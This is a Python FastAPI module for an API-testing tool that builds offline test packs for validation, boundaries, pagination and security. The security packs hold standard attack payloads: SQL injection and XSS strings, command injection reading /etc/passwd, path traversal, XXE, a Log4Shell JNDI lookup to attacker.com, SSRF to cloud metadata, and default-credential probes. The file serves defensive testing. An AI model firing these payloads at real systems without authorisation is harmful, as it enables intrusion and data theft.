# -*- coding: utf-8 -*-
"""
Built-in Test Library — a large, curated, OFFLINE directory of API test cases.

The third test-generation approach alongside "manual" and "AI":
  • manual       — user writes each test
  • ai           — OpenAI generates tests (costs API credits)
  • library      — this module: hundreds of ready-made tests, zero API cost

Tests are organized into "packs". Each pack expands, against a concrete API URL +
sample payload, into a list of test cases in the exact shape the runner expects:

    { method, endpoint, data|params, expected_status: [..], description, category, validate_body }

Exposed via test_library_router:
    GET  /library/catalog                 → packs with metadata + case counts
    POST /library/generate                → concrete test cases for chosen packs
"""

from typing import Any, Dict, List, Optional

from fastapi import APIRouter
from pydantic import BaseModel

test_library_router = APIRouter()


# ──────────────────────────────────────────────────────────
# Payload helpers — derive realistic values from the sample body
# ──────────────────────────────────────────────────────────

def _first_string_field(sample: Dict[str, Any]) -> Optional[str]:
    for k, v in (sample or {}).items():
        if isinstance(v, str):
            return k
    return next(iter(sample), None) if sample else None


def _mutate(sample: Dict[str, Any], field: str, value: Any) -> Dict[str, Any]:
    out = dict(sample or {})
    out[field] = value
    return out


ACCEPT_OR_REJECT = [200, 201, 400, 403, 404, 409, 422]   # tolerant: pass if handled either way
OK = [200, 201]
CLIENT_ERR = [400, 401, 403, 404, 422]


# ──────────────────────────────────────────────────────────
# Pack builders. Each returns List[test case dicts].
# ──────────────────────────────────────────────────────────

def pack_http_methods(sample: Dict[str, Any]) -> List[Dict]:
    return [
        {"method": "GET", "endpoint": "", "expected_status": [200, 204, 404, 405], "description": "GET is handled"},
        {"method": "POST", "endpoint": "", "data": sample, "expected_status": [200, 201, 400, 404, 405, 422], "description": "POST is handled"},
        {"method": "PUT", "endpoint": "", "data": sample, "expected_status": [200, 204, 400, 404, 405, 422], "description": "PUT is handled"},
        {"method": "PATCH", "endpoint": "", "data": sample, "expected_status": [200, 204, 400, 404, 405, 422], "description": "PATCH is handled"},
        {"method": "DELETE", "endpoint": "", "expected_status": [200, 202, 204, 404, 405], "description": "DELETE is handled"},
        {"method": "HEAD", "endpoint": "", "expected_status": [200, 204, 404, 405], "description": "HEAD returns no body"},
        {"method": "OPTIONS", "endpoint": "", "expected_status": [200, 204, 404, 405], "description": "OPTIONS advertises methods"},
        {"method": "TRACE", "endpoint": "", "expected_status": [405, 501, 400, 404], "description": "TRACE should be disabled"},
    ]


def pack_crud_happy(sample: Dict[str, Any]) -> List[Dict]:
    return [
        {"method": "GET", "endpoint": "", "expected_status": [200, 204], "description": "List/read returns 2xx", "validate_body": True},
        {"method": "POST", "endpoint": "", "data": sample, "expected_status": OK, "description": "Create with valid payload", "validate_body": True},
        {"method": "PUT", "endpoint": "", "data": sample, "expected_status": [200, 204], "description": "Full update with valid payload"},
        {"method": "PATCH", "endpoint": "", "data": sample, "expected_status": [200, 204], "description": "Partial update with valid payload"},
        {"method": "GET", "endpoint": "/1", "expected_status": [200, 404], "description": "Read single resource by id"},
        {"method": "DELETE", "endpoint": "/999999", "expected_status": [200, 202, 204, 404], "description": "Delete non-existent id is safe"},
    ]


def pack_validation(sample: Dict[str, Any]) -> List[Dict]:
    field = _first_string_field(sample) or "field"
    tests = [
        {"method": "POST", "endpoint": "", "data": {}, "expected_status": CLIENT_ERR + [200, 201], "description": "Empty body validation"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, None), "expected_status": ACCEPT_OR_REJECT, "description": f"Null value for '{field}'"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, ""), "expected_status": ACCEPT_OR_REJECT, "description": f"Empty string for '{field}'"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, 12345), "expected_status": ACCEPT_OR_REJECT, "description": f"Wrong type (number) for '{field}'"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, [1, 2, 3]), "expected_status": ACCEPT_OR_REJECT, "description": f"Wrong type (array) for '{field}'"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, {"nested": True}), "expected_status": ACCEPT_OR_REJECT, "description": f"Wrong type (object) for '{field}'"},
        {"method": "POST", "endpoint": "", "data": {**(sample or {}), "__unexpected__": "extra"}, "expected_status": ACCEPT_OR_REJECT, "description": "Unexpected extra field is ignored/rejected"},
    ]
    return tests


def pack_boundary(sample: Dict[str, Any]) -> List[Dict]:
    field = _first_string_field(sample) or "field"
    return [
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, "a"), "expected_status": ACCEPT_OR_REJECT, "description": f"Min length (1 char) for '{field}'"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, "a" * 255), "expected_status": ACCEPT_OR_REJECT, "description": f"255-char value for '{field}'"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, "a" * 10000), "expected_status": ACCEPT_OR_REJECT, "description": f"10k-char value for '{field}' (length limit)"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, "  padded  "), "expected_status": ACCEPT_OR_REJECT, "description": f"Whitespace padding for '{field}'"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, "emoji 😀🚀🔥 unicode ☃"), "expected_status": ACCEPT_OR_REJECT, "description": f"Unicode/emoji for '{field}'"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, "тест 日本語 العربية"), "expected_status": ACCEPT_OR_REJECT, "description": f"Multi-byte charsets for '{field}'"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, 2**53), "expected_status": ACCEPT_OR_REJECT, "description": "Large integer beyond safe JS range"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, -1), "expected_status": ACCEPT_OR_REJECT, "description": "Negative number boundary"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, 3.141592653589793), "expected_status": ACCEPT_OR_REJECT, "description": "Float precision boundary"},
    ]


def pack_sql_injection(sample: Dict[str, Any]) -> List[Dict]:
    field = _first_string_field(sample) or "field"
    payloads = [
        "' OR '1'='1", "'; DROP TABLE users; --", "1' UNION SELECT NULL--", "admin'--",
        "' OR 1=1--", "\") OR (\"1\"=\"1", "'; EXEC xp_cmdshell('dir'); --",
        "1; SELECT pg_sleep(5)--", "' OR SLEEP(5)--", "%27%20OR%20%271%27%3D%271",
    ]
    return [
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, p), "expected_status": ACCEPT_OR_REJECT,
         "description": f"SQL injection — {p[:32]}", "category": "security_test"}
        for p in payloads
    ] + [
        {"method": "GET", "endpoint": "", "params": {"id": "1 OR 1=1"}, "expected_status": [200, 400, 403, 404], "description": "SQL injection in query param", "category": "security_test"},
        {"method": "GET", "endpoint": "", "params": {"q": "'; DROP TABLE x;--"}, "expected_status": [200, 400, 403, 404], "description": "SQL injection in search param", "category": "security_test"},
    ]


def pack_xss(sample: Dict[str, Any]) -> List[Dict]:
    field = _first_string_field(sample) or "field"
    payloads = [
        "<script>alert('xss')</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)",
        "<svg onload=alert(1)>", "<iframe src='javascript:alert(1)'>", "\"><script>alert(1)</script>",
        "<body onload=alert(1)>", "<a href='javascript:alert(1)'>click</a>", "{{7*7}}", "${7*7}",
    ]
    return [
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, p), "expected_status": ACCEPT_OR_REJECT,
         "description": f"XSS / template injection — {p[:32]}", "category": "security_test"}
        for p in payloads
    ]


def pack_injection_misc(sample: Dict[str, Any]) -> List[Dict]:
    field = _first_string_field(sample) or "field"
    payloads = {
        "Command injection — semicolon": "; ls -la",
        "Command injection — pipe": "| cat /etc/passwd",
        "Command injection — backtick": "`whoami`",
        "Command injection — subshell": "$(id)",
        "Path traversal — unix": "../../../../etc/passwd",
        "Path traversal — windows": "..\\..\\..\\windows\\win.ini",
        "Path traversal — encoded": "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "LDAP injection": "*)(uid=*))(|(uid=*",
        "NoSQL injection": {"$gt": ""},
        "NoSQL injection — where": {"$where": "sleep(1000)"},
        "XXE / XML entity": "<?xml version='1.0'?><!DOCTYPE a [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><a>&x;</a>",
        "Log4Shell / JNDI": "${jndi:ldap://attacker.com/a}",
        "CRLF injection": "value\r\nSet-Cookie: admin=true",
        "Header injection": "value\nX-Injected: true",
        "SSRF — internal": {"url": "http://169.254.169.254/latest/meta-data/"},
        "SSRF — localhost": {"callback": "http://localhost:22"},
    }
    out = []
    for desc, val in payloads.items():
        data = val if isinstance(val, dict) else _mutate(sample, field, val)
        out.append({"method": "POST", "endpoint": "", "data": data, "expected_status": ACCEPT_OR_REJECT,
                    "description": desc, "category": "security_test"})
    return out


def pack_auth(sample: Dict[str, Any]) -> List[Dict]:
    return [
        {"method": "GET", "endpoint": "", "headers": {"Authorization": ""}, "expected_status": [200, 401, 403], "description": "Empty Authorization header", "category": "security_test"},
        {"method": "GET", "endpoint": "", "headers": {"Authorization": "Bearer invalid.token.here"}, "expected_status": [200, 401, 403], "description": "Invalid bearer token rejected", "category": "security_test"},
        {"method": "GET", "endpoint": "", "headers": {"Authorization": "Bearer expired"}, "expected_status": [200, 401, 403], "description": "Expired-looking token", "category": "security_test"},
        {"method": "GET", "endpoint": "", "headers": {"Authorization": "Basic YWRtaW46YWRtaW4="}, "expected_status": [200, 401, 403], "description": "Basic admin:admin default creds", "category": "security_test"},
        {"method": "GET", "endpoint": "", "headers": {"Authorization": "Bearer null"}, "expected_status": [200, 401, 403], "description": "Literal 'null' token", "category": "security_test"},
        {"method": "GET", "endpoint": "", "headers": {"X-Original-URL": "/admin"}, "expected_status": ACCEPT_OR_REJECT, "description": "Auth bypass via X-Original-URL", "category": "security_test"},
        {"method": "GET", "endpoint": "", "headers": {"X-Forwarded-For": "127.0.0.1"}, "expected_status": ACCEPT_OR_REJECT, "description": "IP spoof via X-Forwarded-For", "category": "security_test"},
    ]


def pack_headers_content(sample: Dict[str, Any]) -> List[Dict]:
    return [
        {"method": "POST", "endpoint": "", "data": sample, "headers": {"Content-Type": "text/plain"}, "expected_status": ACCEPT_OR_REJECT, "description": "Wrong Content-Type (text/plain)"},
        {"method": "POST", "endpoint": "", "data": sample, "headers": {"Content-Type": "application/xml"}, "expected_status": ACCEPT_OR_REJECT, "description": "Wrong Content-Type (application/xml)"},
        {"method": "POST", "endpoint": "", "data": sample, "headers": {"Content-Type": ""}, "expected_status": ACCEPT_OR_REJECT, "description": "Missing Content-Type"},
        {"method": "GET", "endpoint": "", "headers": {"Accept": "application/xml"}, "expected_status": [200, 204, 406, 404], "description": "Accept application/xml (content negotiation)"},
        {"method": "GET", "endpoint": "", "headers": {"Accept-Encoding": "gzip, deflate, br"}, "expected_status": [200, 204, 404], "description": "Compression negotiation"},
        {"method": "GET", "endpoint": "", "headers": {"If-None-Match": "\"nonexistent-etag\""}, "expected_status": [200, 304, 404], "description": "Conditional GET with ETag"},
    ]


def pack_pagination(sample: Dict[str, Any]) -> List[Dict]:
    return [
        {"method": "GET", "endpoint": "", "params": {"page": "1", "limit": "10"}, "expected_status": [200, 204, 400, 404], "description": "Pagination page/limit"},
        {"method": "GET", "endpoint": "", "params": {"offset": "0", "limit": "25"}, "expected_status": [200, 204, 400, 404], "description": "Pagination offset/limit"},
        {"method": "GET", "endpoint": "", "params": {"page": "-1"}, "expected_status": ACCEPT_OR_REJECT, "description": "Negative page number"},
        {"method": "GET", "endpoint": "", "params": {"limit": "1000000"}, "expected_status": ACCEPT_OR_REJECT, "description": "Excessive page size"},
        {"method": "GET", "endpoint": "", "params": {"limit": "abc"}, "expected_status": ACCEPT_OR_REJECT, "description": "Non-numeric limit"},
        {"method": "GET", "endpoint": "", "params": {"sort": "-created_at"}, "expected_status": [200, 204, 400, 404], "description": "Sorting parameter"},
        {"method": "GET", "endpoint": "", "params": {"sort": "id; DROP TABLE"}, "expected_status": ACCEPT_OR_REJECT, "description": "Injection via sort param", "category": "security_test"},
        {"method": "GET", "endpoint": "", "params": {"fields": "id,name"}, "expected_status": [200, 204, 400, 404], "description": "Sparse fieldset selection"},
        {"method": "GET", "endpoint": "", "params": {"filter": "name eq 'test'"}, "expected_status": [200, 204, 400, 404], "description": "Filtering parameter"},
    ]


def pack_edge_cases(sample: Dict[str, Any]) -> List[Dict]:
    field = _first_string_field(sample) or "field"
    return [
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, "null"), "expected_status": ACCEPT_OR_REJECT, "description": "String 'null'"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, "undefined"), "expected_status": ACCEPT_OR_REJECT, "description": "String 'undefined'"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, "true"), "expected_status": ACCEPT_OR_REJECT, "description": "String 'true' vs boolean"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, "0"), "expected_status": ACCEPT_OR_REJECT, "description": "String zero"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, "  "), "expected_status": ACCEPT_OR_REJECT, "description": "Whitespace-only value"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, "\t\n\r"), "expected_status": ACCEPT_OR_REJECT, "description": "Control characters"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, "test@#$%^&*()"), "expected_status": ACCEPT_OR_REJECT, "description": "Special characters"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, "SELECT * FROM"), "expected_status": ACCEPT_OR_REJECT, "description": "SQL keywords as plain text"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, "%00"), "expected_status": ACCEPT_OR_REJECT, "description": "Null byte injection", "category": "security_test"},
        {"method": "POST", "endpoint": "", "data": _mutate(sample, field, "\\x00\\x1f"), "expected_status": ACCEPT_OR_REJECT, "description": "Hex escape sequences"},
    ]


def pack_rate_reliability(sample: Dict[str, Any]) -> List[Dict]:
    return [
        {"method": "GET", "endpoint": "", "expected_status": [200, 204, 404, 429], "description": "Rapid request 1/5 (rate limit probe)"},
        {"method": "GET", "endpoint": "", "expected_status": [200, 204, 404, 429], "description": "Rapid request 2/5 (rate limit probe)"},
        {"method": "GET", "endpoint": "", "expected_status": [200, 204, 404, 429], "description": "Rapid request 3/5 (rate limit probe)"},
        {"method": "GET", "endpoint": "", "expected_status": [200, 204, 404, 429], "description": "Rapid request 4/5 (rate limit probe)"},
        {"method": "GET", "endpoint": "", "expected_status": [200, 204, 404, 429], "description": "Rapid request 5/5 (rate limit probe)"},
        {"method": "POST", "endpoint": "", "data": sample, "expected_status": OK + [409], "description": "Duplicate create (idempotency check) 1/2"},
        {"method": "POST", "endpoint": "", "data": sample, "expected_status": OK + [409], "description": "Duplicate create (idempotency check) 2/2"},
    ]


# Registry: id → (title, description, category, builder)
PACKS = {
    "http_methods":    ("HTTP Methods", "Every verb is handled correctly (GET/POST/PUT/PATCH/DELETE/HEAD/OPTIONS/TRACE)", "functional", pack_http_methods),
    "crud_happy":      ("CRUD Happy Path", "Core create/read/update/delete flows with valid data", "functional", pack_crud_happy),
    "validation":      ("Input Validation", "Empty, null, wrong-type and unexpected fields", "negative_test", pack_validation),
    "boundary":        ("Boundary & Limits", "Min/max length, unicode, large numbers, precision", "edge_case", pack_boundary),
    "edge_cases":      ("Tricky Edge Cases", "Stringly-typed values, control chars, special characters", "edge_case", pack_edge_cases),
    "sql_injection":   ("SQL Injection (OWASP)", "Classic and blind SQL injection payloads", "security_test", pack_sql_injection),
    "xss":             ("XSS & Template Injection", "Reflected/stored XSS and SSTI payloads", "security_test", pack_xss),
    "injection_misc":  ("Injection Suite", "Command, path traversal, XXE, SSRF, Log4Shell, NoSQL, CRLF", "security_test", pack_injection_misc),
    "auth":            ("Auth & Access Control", "Token, basic-auth and header-based bypass probes", "security_test", pack_auth),
    "headers_content": ("Headers & Content Types", "Content negotiation, wrong content types, conditional GET", "functional", pack_headers_content),
    "pagination":      ("Query, Paging & Sorting", "Pagination, filtering, sorting and their abuse", "functional", pack_pagination),
    "rate_reliability":("Rate Limiting & Idempotency", "Burst traffic and duplicate-create behavior", "functional", pack_rate_reliability),
}

# Curated bundles for one-click selection
BUNDLES = {
    "essentials":  ["crud_happy", "validation", "http_methods"],
    "security":    ["sql_injection", "xss", "injection_misc", "auth"],
    "full_owasp":  ["sql_injection", "xss", "injection_misc", "auth", "headers_content"],
    "everything":  list(PACKS.keys()),
}


def _pack_count(pack_id: str) -> int:
    _, _, _, builder = PACKS[pack_id]
    return len(builder({"field": "sample"}))


# ──────────────────────────────────────────────────────────
# API
# ──────────────────────────────────────────────────────────

class LibraryGenerateRequest(BaseModel):
    api_url: str = ""
    sample_data: Dict[str, Any] = {}
    packs: Optional[List[str]] = None       # explicit pack ids
    bundle: Optional[str] = None            # or a named bundle
    limit: Optional[int] = None             # cap total cases


@test_library_router.get("/catalog")
async def catalog():
    packs = [
        {"id": pid, "title": title, "description": desc, "category": cat, "count": _pack_count(pid)}
        for pid, (title, desc, cat, _b) in PACKS.items()
    ]
    bundles = [
        {"id": bid, "packs": pids, "count": sum(_pack_count(p) for p in pids)}
        for bid, pids in BUNDLES.items()
    ]
    return {"packs": packs, "bundles": bundles, "total_cases": sum(p["count"] for p in packs)}


@test_library_router.post("/generate")
async def generate(req: LibraryGenerateRequest):
    pack_ids: List[str] = []
    if req.bundle and req.bundle in BUNDLES:
        pack_ids = BUNDLES[req.bundle]
    if req.packs:
        pack_ids = req.packs
    if not pack_ids:
        pack_ids = BUNDLES["essentials"]

    sample = req.sample_data or {"field": "value"}
    cases: List[Dict] = []
    for pid in pack_ids:
        if pid not in PACKS:
            continue
        title, _desc, category, builder = PACKS[pid]
        for case in builder(sample):
            case.setdefault("category", category)
            case.setdefault("params", None)
            case.setdefault("data", None)
            case.setdefault("validate_body", False)
            case["pack"] = pid
            cases.append(case)

    if req.limit:
        cases = cases[: req.limit]

    return {
        "success": True,
        "source": "library",
        "used_fallback": False,
        "count": len(cases),
        "test_cases": cases,
        "message": f"Loaded {len(cases)} built-in tests (no API cost)",
    }
